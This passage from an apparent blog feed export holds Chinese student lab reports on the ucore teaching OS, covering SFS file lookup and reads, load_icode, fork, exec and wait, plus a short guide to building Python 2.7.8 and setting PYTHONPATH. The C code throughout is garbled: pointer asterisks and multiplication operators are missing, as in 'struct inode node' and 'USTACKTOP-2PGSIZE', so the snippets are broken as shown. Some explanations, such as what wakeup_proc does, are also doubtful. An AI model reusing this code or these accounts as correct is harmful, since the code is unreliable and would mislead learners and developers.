open-&gt;sys_open-&gt;syscall，从而引起系统调用进入到内核态。到了内核态后，通过中断处理例程，会调用到sys_open内核函数，并进一步调用sysfile_open内核函数。到了这里，需要把位于用户空间的字符串”/test/testfile”拷贝到内核空间中的字符串path中，并进入到文件系统抽象层的处理流程完成进一步的打开文件操作中。②文件系统抽象层的处理流程Ⅰ、分配一个空闲的file数据结构变量file在文件系统抽象层的处理中，首先调用的是file_open函数，它要给这个即将打开的文件分配一个file数据结构的变量，这个变量其实是当前进程的打开文件数组current-&gt;fs_struct-&gt;filemap[]中的一个空闲元素（即还没用于一个打开的文件），而这个元素的索引值就是最终要返回到用户进程并赋值给变量fd1。到了这一步还仅仅是给当前用户进程分配了一个file数据结构的变量，还没有找到对应的文件索引节点。 为此需要进一步调用vfs_open函数来找到path指出的文件所对应的基于inode数据结构的VFS索引节点node。vfs_open函数需要完成两件事情：通过vfs_lookup找到path对应文件的inode；调用vop_open函数打开文件。Ⅱ、找到文件设备的根目录“/”的索引节点需要注意，这里的vfs_lookup函数是一个针对目录的操作函数，它会调用vop_lookup函数来找到SFS文件系统中的“/test”目录下的“testfile”文件。为此，vfs_lookup函数首先调用get_device函数，并进一步调用vfs_get_bootfs函数（其实调用了）来找到根目录“/”对应的inode。这个inode就是位于vfs.c中的inode变量bootfs_node。这个变量在init_main函数（位于kern/process/proc.c）执行时获得了赋值。Ⅲ、找到根目录“/”下的“test”子目录对应的索引节点，在找到根目录对应的inode后，通过调用vop_lookup函数来查找“/”和“test”这两层目录下的文件“testfile”所对应的索引节点，如果找到就返回此索引节点。Ⅳ、把file和node建立联系。完成第3步后，将返回到file_open函数中，通过执行语句“file-&gt;node=node;”，就把当前进程的current-&gt;fs_struct-&gt;filemap[fd]（即file所指变量）的成员变量node指针指向了代表“/test/testfile”文件的索引节点node。这时返回fd。经过重重回退，通过系统调用返回，用户态的syscall-&gt;sys_open-&gt;open-&gt;safe_open等用户函数的层层函数返回，最终把把fd赋值给fd1。自此完成了打开文件操作。但这里我们还没有分析第2和第3步是如何进一步调用SFS文件系统提供的函数找位于SFS文件系统上的“/test/testfile”所对应的sfs磁盘inode的过程。下面需要进一步对此进行分析。③SFS文件系统层的处理流程这里需要分析文件系统抽象层中没有彻底分析的vop_lookup函数到底做了啥。下面我们来看看。在sfs_inode.c中的sfs_node_dirops变量定义了“.vop_lookup = sfs_lookup”，所以我们重点分析sfs_lookup的实现。sfs_lookup有三个参数：node，path，node_store。其中node是根目录“/”所对应的inode节点；path是文件“testfile”的绝对路径“/test/testfile”，而node_store是经过查找获得的“testfile”所对应的inode节点。Sfs_lookup函数以“/”为分割符，从左至右逐一分解path获得各个子目录和最终文件对应的inode节点。在本例中是分解出“test”子目录，并调用sfs_lookup_once函数获得“test”子目录对应的inode节点subnode，然后循环进一步调用sfs_lookup_once查找以“test”子目录下的文件“testfile1”所对应的inode节点。当无法分解path后，就意味着找到了testfile1对应的inode节点，就可顺利返回了。sfs_lookup_once将调用sfs_dirent_search_nolock函数来查找与路径名匹配的目录项，如果找到目录项，则根据目录项中记录的inode所处的数据块索引值找到路径名对应的SFS磁盘inode，并读入SFS磁盘inode对的内容，创建SFS内存inode。0x5 代码填写调用了SFS文件系统层的vfs_lookup函数去寻找node，这里在sfs_inode.c中我们能够知道.vop_lookup = sfs_lookup sfs_lookupstatic int sfs_lookup(struct inode node, char path, struct inode node_store) {struct sfs_fs sfs = fsop_info(vop_fs(node), sfs);assert(path != ‘\0’ &amp;&amp; path != ‘/‘); //以“/”为分割符，从左至右逐一分解path获得各个子目录和最终文件对应的inode节点。vop_ref_inc(node);struct sfs_inode sin = vop_info(node, sfs_inode);if (sin-&gt;din-&gt;type != SFS_TYPE_DIR) { vop_ref_dec(node); return -E_NOTDIR;}struct inode subnode;int ret = sfs_lookup_once(sfs, sin, path, &amp;subnode, NULL); //循环进一步调用sfs_lookup_once查找以“test”子目录下的文件“testfile1”所对应的inode节点。vop_ref_dec(node);if (ret != 0) { return ret;} node_store = subnode; //当无法分解path后，就意味着找到了需要对应的inode节点，就可顺利返回了。return 0;}sfs_lookup_once函数，它调用sfs_dirent_search_nolock函数来查找与路径名匹配的目录项，如果找到目录项，则根据目录项中记录的inode所处的数据块索引值找到路径名对应的SFS磁盘inode，并读入SFS磁盘inode对的内容，创建SFS内存inode。 static int sfs_lookup_once(struct sfs_fs sfs, struct sfs_inode sin, const char *name, struct inode node_store, int slot) {int ret;uint32_t ino;lock_sin(sin);{ // find the NO. of disk block and logical index of file entry ret = sfs_dirent_search_nolock(sfs, sin, name, &amp;ino, slot, NULL);}unlock_sin(sin);if (ret == 0) { // load the content of inode with the the NO. of disk block ret = sfs_load_inode(sfs, node_store, ino);}return ret;}接下来我们需要完成sfs_io_nolock函数中读文件的过程，代码如下，这里只将我们所需要填写的部分罗列出来了：static intsfs_io_nolock(struct sfs_fs sfs, struct sfs_inode sin, void buf, off_t offset, size_t alenp, bool write) {…………if ((blkoff = offset % SFS_BLKSIZE) != 0) { //读取第一部分的数据 size = (nblks != 0) ? (SFS_BLKSIZE - blkoff) : (endpos - offset); //计算第一个数据块的大小 if ((ret = sfs_bmap_load_nolock(sfs, sin, blkno, &amp;ino)) != 0) { //找到内存文件索引对应的block的编号ino goto out; } if ((ret = sfs_buf_op(sfs, buf, size, ino, blkoff)) != 0) { goto out; } //完成实际的读写操作 alen += size; if (nblks == 0) { goto out; } buf += size, blkno ++, nblks –;}//读取中间部分的数据，将其分为size大学的块，然后一次读一块直至读完size = SFS_BLKSIZE;while (nblks != 0) { if ((ret = sfs_bmap_load_nolock(sfs, sin, blkno, &amp;ino)) != 0) { goto out; } if ((ret = sfs_block_op(sfs, buf, ino, 1)) != 0) { goto out; } alen += size, buf += size, blkno ++, nblks –;}//读取第三部分的数据if ((size = endpos % SFS_BLKSIZE) != 0) { if ((ret = sfs_bmap_load_nolock(sfs, sin, blkno, &amp;ino)) != 0) { goto out; } if ((ret = sfs_buf_op(sfs, buf, size, ino, 0)) != 0) { goto out; } alen += size;}练习2 完成基于文件系统的执行程序机制的实现改写proc.c中的load_icode函数和其他相关函数，实现基于文件系统的执行程序机制。执行：make qemu。如果能看看到sh用户程序的执行界面，则基本成功了。如果在sh用户界面上可以执行”ls”,”hello”等其他放置在sfs文件系统中的其他执行程序，则可以认为本实验基本成功。在proc.c中，根据注释我们需要先初始化fs中的进程控制结构，即在alloc_proc函数中我们需要做一下修改，加上一句proc-&gt;filesp = NULL;从而完成初始化。然后就是要实现load_icode函数，具体的实现及注释如下所示：static intload_icode(int fd, int argc, char **kargv) { / (1) create a new mm for current process (2) create a new PDT, and mm-&gt;pgdir= kernel virtual addr of PDT (3) copy TEXT/DATA/BSS parts in binary to memory space of process (3.1) read raw data content in file and resolve elfhdr (3.2) read raw data content in file and resolve proghdr based on info in elfhdr (3.3) call mm_map to build vma related to TEXT/DATA (3.4) callpgdir_alloc_page to allocate page for TEXT/DATA, read contents in file and copy them into the new allocated pages (3.5) callpgdir_alloc_page to allocate pages for BSS, memset zero in these pages (4) call mm_map to setup user stack, and put parameters into user stack (5) setup current process’s mm, cr3, reset pgidr (using lcr3 MARCO) (6) setup uargc and uargv in user stacks (7) setup trapframe for user environment (8) if up steps failed, you should cleanup the env. / assert(argc &gt;= 0 &amp;&amp; argc &lt;= EXEC_MAX_ARG_NUM); //(1)建立内存管理器 if (current-&gt;mm != NULL) { //要求当前内存管理器为空 panic(“load_icode: current-&gt;mm must be empty.\n”); } int ret = -E_NO_MEM; // E_NO_MEM代表因为存储设备产生的请求错误 struct mm_struct mm; //建立内存管理器 if ((mm = mm_create()) == NULL) { goto bad_mm; } //(2)建立页目录 if (setup_pgdir(mm) != 0) { goto bad_pgdir_cleanup_mm; } struct Page page;//建立页表 //(3)从文件加载程序到内存 struct elfhdr elf, *elf = &amp;elf; if ((ret = load_icode_read(fd, elf, sizeof(struct elfhdr), 0)) != 0) {//读取elf文件头 goto bad_elf_cleanup_pgdir; } if (elf-&gt;e_magic != ELF_MAGIC) { ret = -E_INVAL_ELF; goto bad_elf_cleanup_pgdir; } struct proghdr ph, *ph = &amp;ph; uint32_t vm_flags, perm, phnum; for (phnum = 0; phnum &lt; elf-&gt;e_phnum; phnum ++) { //e_phnum代表程序段入口地址数目，即多少各段 off_t phoff = elf-&gt;e_phoff + sizeof(struct proghdr) phnum; //循环读取程序的每个段的头部 if ((ret = load_icode_read(fd, ph, sizeof(struct proghdr), phoff)) != 0) { goto bad_cleanup_mmap; } if (ph-&gt;p_type != ELF_PT_LOAD) { continue ; } if (ph-&gt;p_filesz &gt; ph-&gt;p_memsz) { ret = -E_INVAL_ELF; goto bad_cleanup_mmap; } if (ph-&gt;p_filesz == 0) { continue ; } vm_flags = 0, perm = PTE_U;//建立虚拟地址与物理地址之间的映射 if (ph-&gt;p_flags &amp; ELF_PF_X) vm_flags |= VM_EXEC; if (ph-&gt;p_flags &amp; ELF_PF_W) vm_flags |= VM_WRITE; if (ph-&gt;p_flags &amp; ELF_PF_R) vm_flags |= VM_READ; if (vm_flags &amp; VM_WRITE) perm |= PTE_W; if ((ret = mm_map(mm, ph-&gt;p_va, ph-&gt;p_memsz, vm_flags, NULL)) != 0) { goto bad_cleanup_mmap; } off_t offset = ph-&gt;p_offset; size_t off, size; uintptr_t start = ph-&gt;p_va, end, la = ROUNDDOWN(start, PGSIZE); ret = -E_NO_MEM; //复制数据段和代码段 end = ph-&gt;p_va + ph-&gt;p_filesz; //计算数据段和代码段终止地址 while (start &lt; end) { if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) { ret = -E_NO_MEM; goto bad_cleanup_mmap; } off = start - la, size = PGSIZE - off, la += PGSIZE; if (end &lt; la) { size -= la - end; } //每次读取size大小的块，直至全部读完 if ((ret = load_icode_read(fd, page2kva(page) + off, size, offset)) != 0) { //load_icode_read通过sysfile_read函数实现文件读取 goto bad_cleanup_mmap; } start += size, offset += size; } //建立BSS段 end = ph-&gt;p_va + ph-&gt;p_memsz; //同样计算终止地址 if (start &lt; la) { if (start == end) { continue ; } off = start + PGSIZE - la, size = PGSIZE - off; if (end &lt; la) { size -= la - end; } memset(page2kva(page) + off, 0, size); start += size; assert((end &lt; la &amp;&amp; start == end) || (end &gt;= la &amp;&amp; start == la)); } while (start &lt; end) { if ((page = pgdir_alloc_page(mm-&gt;pgdir, la, perm)) == NULL) { ret = -E_NO_MEM; goto bad_cleanup_mmap; } off = start - la, size = PGSIZE - off, la += PGSIZE; if (end &lt; la) { size -= la - end; } //每次操作size大小的块 memset(page2kva(page) + off, 0, size); start += size; } } sysfile_close(fd);//关闭文件，加载程序结束 //(4)建立相应的虚拟内存映射表 vm_flags = VM_READ | VM_WRITE | VM_STACK; if ((ret = mm_map(mm, USTACKTOP - USTACKSIZE, USTACKSIZE, vm_flags, NULL)) != 0) { goto bad_cleanup_mmap; } assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-PGSIZE , PTE_USER) != NULL); assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-2PGSIZE , PTE_USER) != NULL); assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-3PGSIZE , PTE_USER) != NULL); assert(pgdir_alloc_page(mm-&gt;pgdir, USTACKTOP-4PGSIZE , PTE_USER) != NULL); //(5)设置用户栈 mm_count_inc(mm); current-&gt;mm = mm; current-&gt;cr3 = PADDR(mm-&gt;pgdir); lcr3(PADDR(mm-&gt;pgdir)); //(6)处理用户栈中传入的参数，其中argc对应参数个数，uargv[]对应参数的具体内容的地址 uint32_t argv_size=0, i; for (i = 0; i &lt; argc; i ++) { argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + 1)+1; } uintptr_t stacktop = USTACKTOP - (argv_size/sizeof(long)+1)sizeof(long); char uargv=(char )(stacktop - argc sizeof(char )); argv_size = 0; for (i = 0; i &lt; argc; i ++) { //将所有参数取出来放置uargv uargv[i] = strcpy((char )(stacktop + argv_size ), kargv[i]); argv_size += strnlen(kargv[i],EXEC_MAX_ARG_LEN + 1)+1; } stacktop = (uintptr_t)uargv - sizeof(int); //计算当前用户栈顶 (int )stacktop = argc; //(7)设置进程的中断帧 struct trapframe *tf = current-&gt;tf; memset(tf, 0, sizeof(struct trapframe));//初始化tf，设置中断帧 tf-&gt;tf_cs = USER_CS; tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS; tf-&gt;tf_esp = stacktop; tf-&gt;tf_eip = elf-&gt;e_entry; tf-&gt;tf_eflags = FL_IF; ret = 0; //(8)错误处理部分out: return ret; //返回bad_cleanup_mmap: exit_mmap(mm);bad_elf_cleanup_pgdir: put_pgdir(mm);bad_pgdir_cleanup_mm: mm_destroy(mm);bad_mm: goto out;}load_icode主要是将文件加载到内存中执行，根据注释的提示分为了一共七个步骤：1、建立内存管理器2、建立页目录3、将文件逐个段加载到内存中，这里要注意设置虚拟地址与物理地址之间的映射4、建立相应的虚拟内存映射表5、建立并初始化用户堆栈6、处理用户栈中传入的参数7、最后很关键的一步是设置用户进程的中断帧实验结果实验心得本次实验让我重新认识了文件系统的管理，其中第二个小是一个大综合，结合了前面的物理内存，虚拟内存，进程，文件操作系统，用户栈···，做过之后感觉对以前知识的掌握更加的牢固。但同时我对于文件用户的权限管理不是太了解，接下来会进一步学习。]]></content>
      <tags>
        <tag>操作系统实验</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python 2.7.8 手动安装 & Python 环境变量添加]]></title>
    <url>%2F2017%2F06%2F06%2FPython%202.7.8%20%E6%89%8B%E5%8A%A8%E5%AE%89%E8%A3%85%20%26%20Python%20%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B7%BB%E5%8A%A0%2F</url>
    <content type="text"><![CDATA[Python 2.7.8 手动安装 &amp; Python 环境变量添加 0x01 Python 2.7.8 手动安装0x1 源码https://www.python.org/download/releases/2.7.8 倒数第2个0x2 解压xz -d Python-2.7.6.tar.xz tar xvf Python-2.7.6.tar0x3 编译(1) 执行configure脚本./configure(2) 编译源代码make(3) 安装编译好的软件sudo make install发现一直编译失败 此时必须删除以前的python文件 分别存在/usr/lib/python2.x or /usr/local/lib/python2.x) 上述步骤只是完成了python的安装但 没有设置python环境变量 ，导致pip安装的模块import无法找到。下面介绍一下环境变量的添加0x02 Python 环境变量添加当import 模块的时候python会便利寻找 sys.path 下的内容 因此如果要想自己的模块直接可以import 需要添加python环境变量(1) 永久添加 （当前用户）在用户主目录下有一个 .bashrc 隐藏文件，可以在此文件中加入 PATH 的设置如下： vim ~/.bashrc 添加 export PYTHONPATH=/usr/local/lib/python2.7/dist-packages:$PYTHONPATH source ~/.bashrc(2) 永久添加 （所有用户）vim /etc/profile export PYTHONPATH=/usr/local/lib/python2.7/dist-packages:$PYTHONPATH 需重启才能生效(2) 临时添加当前终端下输入 export PYTHONPATH=/usr/local/lib/python2.7/dist-packages:$PYTHONPATH]]></content>
      <tags>
        <tag>软件及应用配置</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[操作系统实验报告 lab5]]></title>
    <url>%2F2017%2F05%2F31%2F%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A%20lab5%2F</url>
    <content type="text"><![CDATA[实验目的： 1.了解第一个用户进程创建过程 2.了解系统调用框架的实现机制 3.了解ucore如何实现系统调用sys_fork/sys_exec/sys_exit/sys_wait来进行进程管理练习0 填写已有实验idt_init函数trip_dispatch函数alloc_proc函数do_fork函数练习1加载应用程序并执行load_icode函数执行流程分析 实验目的： 1.了解第一个用户进程创建过程 2.了解系统调用框架的实现机制 3.了解ucore如何实现系统调用sys_fork/sys_exec/sys_exit/sys_wait来进行进程管理练习0 填写已有实验idt_init函数trip_dispatch函数alloc_proc函数do_fork函数练习1加载应用程序并执行load_icode函数执行流程分析代码填写堆栈情况练习2 父进程复制自己的内存空间给子进程练习3 阅读分析源代码理解进程执行forkexecwaitexit的实现以及系统调用的实现关于系统调用实验心得练习0 填写已有实验利用meld软件进行对比，截图如下 找到要修改的地方：proc.cdefault_pmm.cpmm.cswap_fifo.cvmm.ctrap.ckdebug.c题目并没有结束，还要将代码进一步改进idt_init函数 / LAB5 YOUR CODE / //you should update your lab1 code (just add ONE or TWO lines of code), let user app to use syscall to get the service of ucore //so you should setup the syscall interrupt gate in here extern uintptr_t vectors[]; int i; for (i = 0; i &lt; sizeof(idt) / sizeof(struct gatedesc); i ++) { SETGATE(idt[i], 0, GD_KTEXT, vectors[i], DPL_KERNEL); } SETGATE(idt[T_SYSCALL], 1, GD_KTEXT, vectors[T_SYSCALL], DPL_USER);//设置相应中断门即可 lidt(&amp;idt_pd); 改进SETGATE(idt[T_SYSCALL], 1, GD_KTEXT, vectors[T_SYSCALL], DPL_USER);//设置相应中断门即可 在上述代码中，可以看到在执行加载中断描述符表lidt指令前，专门设置了一个特殊的中断描述符idt[T_SYSCALL]，它的特权级设置为DPL_USER，中断向量处理地址在vectors[T_SYSCALL]处。这样建立好这个中断描述符后，一旦用户进程执行“INT T_SYSCALL”后，由于此中断允许用户态进程产生（注意它的特权级设置为DPL_USER），所以CPU就会从用户态切换到内核态，保存相关寄存器，并跳转到vectors[TSYSCALL]处开始执行，形成如下执行路径： vector128(vectors.S)–\&gt; \_alltraps(trapentry.S)–\&gt;trap(trap.c)–\&gt;trap_dispatch(trap.c)—-\&gt;syscall(syscall.c)- 在syscall中，根据系统调用号来完成不同的系统调用服务。trip_dispatch函数 / LAB5 YOUR CODE / / you should upate you lab1 code (just add ONE or TWO lines of code): Every TICK_NUM cycle, you should set current process’s current-&gt;need_resched = 1 / ticks ++; if (ticks % TICK_NUM == 0) { assert(current != NULL); current-&gt;need_resched = 1;//时间片用完设置为需要调度 } 代码改进current-&gt;need_resched = 1;//时间片用完设置为需要调度alloc_proc函数 //LAB5 YOUR CODE : (update LAB4 steps) / below fields(add in LAB5) in proc_struct need to be initialized uint32_t wait_state; // waiting state struct proc_struct cptr, yptr, optr; // relations between processes / proc-&gt;state = PROC_UNINIT;//设置进程为未初始化状态 proc-&gt;pid = -1; //未初始化的进程id=-1 proc-&gt;runs = 0; //初始化时间片 proc-&gt;kstack = 0; //初始化内存栈的地址 proc-&gt;need_resched = 0; //是否需要调度设为不需要 proc-&gt;parent = NULL; //置空父节点 proc-&gt;mm = NULL; //置空虚拟内存 memset(&amp;(proc-&gt;context), 0, sizeof(struct context));//初始化上下文 proc-&gt;tf = NULL; //中断帧指针设置为空 proc-&gt;cr3 = boot_cr3; //页目录设为内核页目录表的基址 proc-&gt;flags = 0; //初始化标志位 memset(proc-&gt;name, 0, PROC_NAME_LEN);//置空进程名 proc-&gt;wait_state = 0; //初始化进程等待状态 proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = NULL;//进程相关指针初始化 代码改进 proc-&gt;wait_state = 0; //初始化进程等待状态 proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = NULL;//进程相关指针初始化 实验涉及到用户进程，所以会用涉及调度问题，进程相关指针会被初始化do_fork函数 //LAB5 YOUR CODE : (update LAB4 steps) / Some Functions set_links: set the relation links of process. ALSO SEE: remove_links: lean the relation links of process ——————- update step 1: set child proc‘s parent to current process, make sure current process’s wait_state is 0 update step 5: insert proc_struct into hash_list &amp;&amp; proc_list, set the relation links of process / if ((proc = alloc_proc()) == NULL) { goto fork_out; } proc-&gt;parent = current; assert(current-&gt;wait_state == 0); //确保当前进程为等待进程 if (setup_kstack(proc) != 0) { goto bad_fork_cleanup_proc; } if (copy_mm(clone_flags, proc) != 0) { goto bad_fork_cleanup_kstack; } copy_thread(proc, stack, tf); bool intr_flag; local_intr_save(intr_flag); { proc-&gt;pid = get_pid(); hash_proc(proc); set_links(proc);//设置进程的相关链接 } local_intr_restore(intr_flag); wakeup_proc(proc); ret = proc-&gt;pid; 代码改进 assert(current-&gt;wait_state == 0); //确保当前进程为等待进程 set_links(proc);//设置进程的相关链接练习1：加载应用程序并执行do_execv函数调用load_icode（位于kern/process/proc.c中）来加载并解析一个处于内存中的ELF执行文件格式的应用程序，建立相应的用户内存空间来放置应用程序的代码段、数据段等，且要设置好proc_struct结构中的成员变量trapframe中的内容，确保在执行此进程后，能够从应用程序设定的起始执行地址开始执行。需设置正确的trapframe内容。 load_icode函数执行流程分析①调用mm_create函数来申请进程的内存管理数据结构mm所需内存空间，并对mm进行初始化；②调用setup_pgdir来申请一个页目录表所需的一个页大小的内存空间，并把描述ucore内核虚空间映射的内核页表（boot_pgdir所指）的内容拷贝到此新目录表中，最后让mm-&gt;pgdir指向此页目录表，这就是进程新的页目录表了，且能够正确映射内核虚空间；③根据应用程序执行码的起始位置来解析此ELF格式的执行程序，并调用mm_map函数根据ELF格式的执行程序说明的各个段（代码段、数据段、BSS段等）的起始位置和大小建立对应的vma结构，并把vma插入到mm结构中，从而表明了用户进程的合法用户态虚拟地址空间；④调用根据执行程序各个段的大小分配物理内存空间，并根据执行程序各个段的起始位置确定虚拟地址，并在页表中建立好物理地址和虚拟地址的映射关系，然后把执行程序各个段的内容拷贝到相应的内核虚拟地址中，至此应用程序执行码和数据已经根据编译时设定地址放置到虚拟内存中了；⑤需要给用户进程设置用户栈，为此调用mm_mmap函数建立用户栈的vma结构，明确用户栈的位置在用户虚空间的顶端，大小为256个页，即1MB，并分配一定数量的物理内存且建立好栈的虚地址&lt;–&gt;物理地址映射关系；⑥至此,进程内的内存管理vma和mm数据结构已经建立完成，于是把mm-&gt;pgdir赋值到cr3寄存器中，即更新了用户进程的虚拟内存空间，此时的initproc已经被程序的代码和数据覆盖，成为了第一个用户进程，但此时这个用户进程的执行现场还没建立好；⑦先清空进程的中断帧，再重新设置进程的中断帧，使得在执行中断返回指令“iret”后，能够让CPU转到用户态特权级，并回到用户态内存空间，使用用户态的代码段、数据段和堆栈，且能够跳转到用户进程的第一条指令执行，并确保在用户态能够响应中断；至此，用户进程的用户环境已经搭建完毕。此时initproc将按产生系统调用的函数调用路径原路返回，执行中断返回指令“iret”（位于trapentry.S的最后一句）后，将切换到用户进程hello的第一条语句位置_start处（位于user/libs/initcode.S的第三句）开始执行。代码填写#define KSTACKPAGE 2 // # of pages in kernel stack#define KSTACKSIZE (KSTACKPAGE PGSIZE) // sizeof kernel stack#define USERTOP 0xB0000000#define USTACKTOP USERTOP#define USTACKPAGE 256 // # of pages in user stack#define USTACKSIZE (USTACKPAGE PGSIZE) // sizeof user stack#define USERBASE 0x00200000#define UTEXT 0x00800000 // where user programs generally begin#define USTAB USERBASE / LAB5:EXERCISE1 YOUR CODE should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So tf_cs should be USER_CS segment (see memlayout.h) tf_ds=tf_es=tf_ss should be USER_DS segment tf_esp should be the top addr of user stack (USTACKTOP) tf_eip should be the entry point of this binary program (elf-&gt;e_entry) tf_eflags should be set to enable computer to produce Interrupt /tf-&gt;tf_cs = USER_CS; tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS; tf-&gt;tf_esp = USTACKTOP; tf-&gt;tf_eip = elf-&gt;e_entry; tf-&gt;tf_eflags = FL_IF;//FL_IF为中断打开状态 ret = 0;out: return ret;bad_cleanup_mmap: exit_mmap(mm);bad_elf_cleanup_pgdir: put_pgdir(mm);bad_pgdir_cleanup_mm: mm_destroy(mm);bad_mm: goto out;} 题目中要求对trapframe，确保在执行此进程后，能够从应用程序设定的起始执行地址开始执行。这里其实一个保存现场的作用，当执行完程序之后能够回到原有的地方。 具体的使用是 在执行trap函数前，软件还需进一步保存执行系统调用前的执行现场，即把与用户进程继续执行所需的相关寄存器等当前内容保存到当前进程的中断帧trapframe中（注意，在创建进程是，把进程的trapframe放在给进程的内核栈分配的空间的顶部）。软件做的工作在vector128和alltraps的起始部分：vectors.S::vector128起始处: pushl $0 pushl $128……trapentry.S::alltraps起始处:pushl %ds pushl %es pushal…… 自此，用于保存用户态的用户进程执行现场的trapframe的内容填写完毕，操作系统可开始完成具体的系统调用服务。在sys_getpid函数中，简单地把当前进程的pid成员变量做为函数返回值就是一个具体的系统调用服务。完成服务后，操作系统按调用关系的路径原路返回到__alltraps中。然后操作系统开始根据当前进程的中断帧内容做恢复执行现场操作。其实就是把trapframe的一部分内容保存到寄存器内容。恢复寄存器内容结束后，调整内核堆栈指针到中断帧的tf_eip处，这是内核栈的结构如下：/ below here defined by x86 hardware / uintptr_t tf_eip; uint16_t tf_cs; uint16_t tf_padding3; uint32_t tf_eflags;/ below here only when crossing rings / uintptr_t tf_esp; uint16_t tf_ss; uint16_t tf_padding4;这时执行“IRET”指令后，CPU根据内核栈的情况回复到用户态，并把EIP指向tf_eip的值，即“INT T_SYSCALL”后的那条指令。这样整个系统调用就执行完毕了。堆栈情况将上述代码结合着下面的堆栈图可以很容易的理解 填写内容/ Virtual memory map: Permissions kernel/user 4G ------------------&gt; +---------------------------------+ | | | Empty Memory () | | | +---------------------------------+ 0xFB000000 | Cur. Page Table (Kern, RW) | RW/-- PTSIZE VPT -----------------&gt; +---------------------------------+ 0xFAC00000 | Invalid Memory () | --/-- KERNTOP -------------&gt; +---------------------------------+ 0xF8000000 | | | Remapped Physical Memory | RW/-- KMEMSIZE | | KERNBASE ------------&gt; +---------------------------------+ 0xC0000000 | Invalid Memory () | --/-- USERTOP -------------&gt; +---------------------------------+ 0xB0000000 | User stack | +---------------------------------+ | | : : | ~~~~ | : : | | ~~~~~~~ | User Program &amp; Heap | UTEXT ---------------&gt; +---------------------------------+ 0x00800000 | Invalid Memory () | --/-- | - - - - - - - - - - - - - - - | | User STAB Data (optional) | USERBASE, USTAB------&gt; +---------------------------------+ 0x00200000 | Invalid Memory () | --/-- 0 -------------------&gt; +---------------------------------+ 0x00000000 () Note: The kernel ensures that “Invalid Memory” is never mapped. “Empty Memory” is normally unmapped, but user programs may map pages there if desired. /练习2: 父进程复制自己的内存空间给子进程创建子进程的函数do_fork在执行中将拷贝当前进程（即父进程）的用户内存地址空间中的合法内容到新进程中（子进程），完成内存资源的复制。具体是通过copy_range函数（位于kern/mm/pmm.c中）实现的，请补充copy_range的实现，确保能够正确执行。如题，这个工作的完整由do_fork函数完成，具体是调用copy_range 函数，而这里我们的任务就是补全这个函数。 这个具体的调用过程是由do_fork函数调用copy_mm函数，然后copy_mm函数调用dup_mmap函数，最后由这个dup_mmap函数调用copy_range函数。即do_fork()—-&gt;copy_mm()—-&gt;dup_mmap()—-&gt;copy_range()代码填写如下int copy_range(pde_t to, pde_t from, uintptr_t start, uintptr_t end, bool share) { …… …… void kva_src = page2kva(page);//返回父进程的内核虚拟页地址 void kva_dst = page2kva(npage);//返回子进程的内核虚拟页地址 memcpy(kva_dst, kva_src, PGSIZE);//复制父进程到子进程 ret = page_insert(to, npage, start, perm);//建立子进程页地址起始位置与物理地址的映射关系(prem是权限) …… ……}练习3 阅读分析源代码,理解进程执行fork/exec/wait/exit的实现,以及系统调用的实现fork首先当程序执行fork时，fork使用了系统调用SYS_fork,而系统调用SYS_fork则主要是由do_fork和wakeup_proc来完成的。do_fork()完成的工作在lab4的时候已经做过详细介绍，这里再简单说一下，主要是完成了以下工作：1、分配并初始化进程控制块(alloc_proc 函数);2、分配并初始化内核栈(setup_stack 函数);3、根据 clone_flag标志复制或共享进程内存管理结构(copy_mm 函数);4、设置进程在内核(将来也包括用户态)正常运行和调度所需的中断帧和执行上下文(copy_thread 函数);5、把设置好的进程控制块放入hash_list 和 proc_list 两个全局进程链表中;6、自此,进程已经准备好执行了,把进程状态设置为“就绪”态;7、设置返回码为子进程的 id 号。而wakeup_proc函数主要是将进程的状态设置为等待，即proc-&gt;wait_state = 0，此处不赘述。exec当应用程序执行的时候，会调用SYS_exec系统调用,而当ucore收到此系统调用的时候，则会使用do_execve()函数来实现，因此这里我们主要介绍do_execve()函数的功能，函数主要时完成用户进程的创建工作，同时使用户进程进入执行。 主要工作如下：1、首先为加载新的执行码做好用户态内存空间清空准备。如果mm不为NULL，则设置页表为内核空间页表，且进一步判断mm的引用计数减1后是否为0，如果为0，则表明没有进程再需要此进程所占用的内存空间，为此将根据mm中的记录，释放进程所占用户空间内存和进程页表本身所占空间。最后把当前进程的mm内存管理指针为空。2、接下来是加载应用程序执行码到当前进程的新创建的用户态虚拟空间中。之后就是调用load_icode从而使之准备好执行。（具体load_icode的功能在练习1已经介绍的很详细了，这里不赘述了）wait 当执行wait功能的时候，会调用系统调用SYS_wait，而该系统调用的功能则主要由do_wait函数实现，完成对子进程的最后回收工作，即回收子进程的内核栈和进程控制块所占内存空间。 具体的功能实现如下：1、 如果 pid!=0，表示只找一个进程 id 号为 pid 的退出状态的子进程，否则找任意一个处于退出状态的子进程;2、 如果此子进程的执行状态不为PROC_ZOMBIE，表明此子进程还没有退出，则当前进程设置执行状态为PROC_SLEEPING（睡眠），睡眠原因为WT_CHILD(即等待子进程退出)，调用schedule()函数选择新的进程执行，自己睡眠等待，如果被唤醒，则重复跳回步骤 1 处执行;3、 如果此子进程的执行状态为 